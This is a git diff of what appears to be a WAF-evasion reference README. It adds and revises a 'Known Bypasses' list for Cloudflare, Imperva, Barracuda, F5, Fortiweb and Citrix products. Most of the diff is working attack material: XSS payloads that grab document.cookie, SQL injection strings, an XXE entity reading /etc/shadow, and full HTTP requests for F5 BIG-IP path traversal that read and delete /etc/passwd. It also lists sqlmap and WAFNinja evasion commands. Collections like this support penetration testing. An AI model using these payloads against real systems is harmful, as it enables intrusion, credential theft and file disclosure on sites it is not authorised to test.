@@ -1557,98 +1557,162 @@ __Method:__
 
 __Techniques:__  
 Before anything else, its time to [hone up our skills via Google Dorks Cheat Sheet](http://pdf.textfiles.com/security/googlehackers.pdf).
-##### Step 1:
-Normal search:  
-`<wafname> waf bypass`
+- Normal search:  
+`+<wafname> waf bypass`
 
-##### Step 2:
+- Searching for specific version exploits:  
+`"<wafname> <version>" bypass`
 
+- On [Exploit DB](https://exploit-db.com):  
+`site:exploit-db.com +<wafname> bypass`
+
+- On [0Day Inject0r DB](https://0day.today):  
+`site:0day.today +<wafname> bypass`
+
+- On [Twitter](https://twitter.com):  
+`site:twitter.com +<wafname> bypass`
 
 ## Known Bypasses:
 ### __Cloudflare__ 
-- Cross Site Scripting _([Source1](https://twitter.com/ArbazKiraak/status/1090654066986823680), [Source2](https://twitter.com/LooseSecurity/status/1094615936223625216?s=20))_
+- XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
 ```
-<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>
-<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
 ```
 
 ### __Imperva SecureSphere__ 
-* Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+- XSS Bypass by [@WAFNinja](https://waf.ninja)
 ```
 %3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E
 ```
-* SQL Injection _([Source 1](https://www.exploit-db.com/exploits/35729), [Source 2](https://www.exploit-db.com/exploits/28854))_
+- XSS Bypass by [@i_bo0om](https://twitter.com/i_bo0om)
+```
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+<img/src=q onerror='new Function`al\ert\`1\``'>
+```
+- SQLi Bypass by [@DRK1WI](https://www.exploit-db.com/?author=7740)
 ```
 15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
+```
+- SQLi by [@Giuseppe D'Amore](https://www.exploit-db.com/?author=6413)
+```
 stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
 ```
 
 ### __Barracuda__ 
-- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+- Cross Site Scripting by [@WAFNinja](https://waf.ninja)
 ```
 <body style="height:1000px" onwheel="alert(1)">
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
 <b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
 ```
-- HTML Injection _([Source](https://www.exploit-db.com/exploits/33423))_
+- HTML Injection by [@Global-Evolution](https://www.exploit-db.com/?author=2016)
 ```
-/cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
+GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_US
+Host: favoritewaf.com
+User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
 ```
 
 ### __DotDefender__  
-- Reflected Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+- R-XSS Bypass by [@WAFNinja](https://waf.ninja)
 ```
 <svg/onload=prompt(1);>
 <isindex action="javas&tab;cript:alert(1)" type=image>
 <marquee/onstart=confirm(2)>
 ```
-* GET - Cross Site Scripting _([Source](https://www.exploit-db.com/exploits/14355))_
+- GET - XSS Bypass by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
+/search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E
+
 <img src="WTF" onError="{var
 {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2B
 h%2Bn)(/0wn3d/.source)" />
 ```
 
-* POST Based Cross Site Scripting _([Source](https://www.exploit-db.com/exploits/14355))_
+- POST - XSS Bypass by [@DavidK](https://www.exploit-db.com/?author=2741)
 ```
 <img src="WTF" onError="{var
 {3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/
 .source)" />
 ```
 
-### __Fortiweb__  
-- Cross Site Scripting _([Source](https://www.exploit-db.com/exploits/38100))_
+### __Fortinet Fortiweb__
+- `pcre_expression` unvaidated XSS by [@Benjamin Mejri](https://www.exploit-db.com/?author=7854)
 ```
 /waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
 /waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0 
 ```
+- CSP Bypass by [@Binar10](https://www.exploit-db.com/exploits/18840)
+
+POST Type Query
+```
+POST /<path>/login-app.aspx HTTP/1.1
+Host: <host>
+User-Agent: <any valid user agent string>
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: <the content length must be at least 2399 bytes>
+
+var1=datavar1&var2=datavar12&pad=<random data to complete at least 2399 bytes>
+```
+GET Type Query
+```
+http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
+```
 
 ### __F5 ASM__ 
-- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+- XSS Bypass by [@WAFNinja](https://waf.ninja)
 ```
 <table background="javascript:alert(1)"></table>
 "/><marquee onfinish=confirm(123)>a</marquee>
 ```
 
 ### __F5 BIG-IP__ 
-- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+- XSS Bypass by [@WAFNinja](https://waf.ninja/)
 ```
 <body style="height:1000px" onwheel="[DATA]">
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
 <body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
 <div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
 ```
-
-### __ModSecurity__ 
-- Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+- POST Based XXE by [@Anonymous](https://www.exploit-db.com/?author=2168)
 ```
-<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>
-<object%00something allowScriptAccess=always data=//0me.me/demo/xss/flash/normalEmbededXSS.swf?
-<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
+<?xml version="1.0" encoding='utf-8' ?>
+<!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]>
+<message><dialogueType>&e;</dialogueType></message>
+```
+- F5 BIG-IP Directory Traversal by [@Anastasios Monachos](https://www.exploit-db.com/?author=2932)
+
+Read Arbitrary File
+```
+/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd
+```
+Delete Arbitrary File
+```
+POST /tmui/Control/form HTTP/1.1
+Host: site.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=""; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage="/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd"; f5currenttab="main"; f5mainmenuopenlist=""; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwd
+Content-Type: application/x-www-form-urlencoded
+
+_form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&showObjList=&showObjList_before=&hideObjList=&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue=icHjvahr354NZKtgQXl5yh2b&_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&linked_add_id=&linked_add_id_before=&name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&restore_before=Restore&delete=Delete&delete_before=Delete
+```
+- [F5 BIG-IP 11.6 SSL Virtual Server - 'Ticketbleed' Memory Disclosure](https://www.exploit-db.com/exploits/44446) by [@0x00String](https://www.exploit-db.com/?author=7028).
+- [F5 BIG-IP Remote Root Authentication Bypass Vulnerability](https://www.exploit-db.com/exploits/19091) by [@Rel1k](https://www.exploit-db.com/?author=1593).
+
+### F5 FirePass
+- SQLi Bypass from [@Anonymous](https://www.exploit-db.com/?author=2168)
+```
+state=%2527+and+
+(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+
+BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+ 
 ```
 
 ### __Citrix NetScaler NS10.5__ 
-- HTTP Parameter Pollution _([Source](https://www.exploit-db.com/exploits/36369))_
+- HTTP Parameter Pollution [@BGA Security](https://www.exploit-db.com/?author=7396)
 ```
 <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
    <soapenv:Header/>
@@ -1657,6 +1721,11 @@ h%2Bn)(/0wn3d/.source)" />
     </soapenv:Body>
 </soapenv:Envelope>
 ```
+
+- `generic_api_call.pl` XSS by [@NNPoster](https://www.exploit-db.com/?author=6654)
+```
+/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
+``` 
 
 ### __WebKnight__ 
 - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
@@ -1694,19 +1763,14 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ### WAF Fingerprinting:
 __1. Fingerprinting with [NMap](https://nmap.org)__:  
 Source: [GitHub](https://github.com/nmap/nmap) | [SVN](http://svn.nmap.org)
-- Normal WAF Fingerprinting
+- Normal WAF Fingerprinting  
+`nmap --script=http-waf-fingerprint <target>`
 
-```
-nmap --script=http-waf-fingerprint <target>
-```
-- Intensive WAF Fingerprinting
-```
-nmap --script=http-waf-fingerprint  --script-args http-waf-fingerprint.intensive=1 <target>
-```
-- Generic Detection
-``` 
-nmap --script=http-waf-detect <target>
-```
+- Intensive WAF Fingerprinting  
+`nmap --script=http-waf-fingerprint  --script-args http-waf-fingerprint.intensive=1 <target>`
+
+- Generic Detection  
+` nmap --script=http-waf-detect <target>`
 
 __2. Fingerprinting with [WafW00f](https://github.com/EnableSecurity/wafw00f)__:  
 Source: [GitHub](https://github.com/enablesecurity/wafw00f) | [Pypi](https://pypi.org/project/wafw00f)
@@ -1739,18 +1803,15 @@ sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostro
 
 __2. Evading WAFs with [WAFNinja](https://waf.ninja/)__  
 Source: [GitHub](https://github.com/khalilbijjou/wafninja)
-- Fuzzing
-```
-python wafninja.py fuzz -u <target> -t xss
-```
-- Bypassing
-```
-python wafninja.py bypass -u <target> -p "name=<payload>&Submit=Submit" -t xss
-```
-- Insert Fuzzing
-```
-python wafninja.py insert-fuzz -i select -e select -t sql
-```
+- Fuzzing  
+`python wafninja.py fuzz -u <target> -t xss`
+
+- Bypassing  
+`python wafninja.py bypass -u <target> -p "name=<payload>&Submit=Submit" -t xss`
+
+- Insert Fuzzing  
+`python wafninja.py insert-fuzz -i select -e select -t sql`
+
 
 __3. Evading WAFs with [WhatWaf](https://github.com/ekultek/whatwaf)__:  
 Source: [GitHub](https://github.com/ekultek/whatwaf)
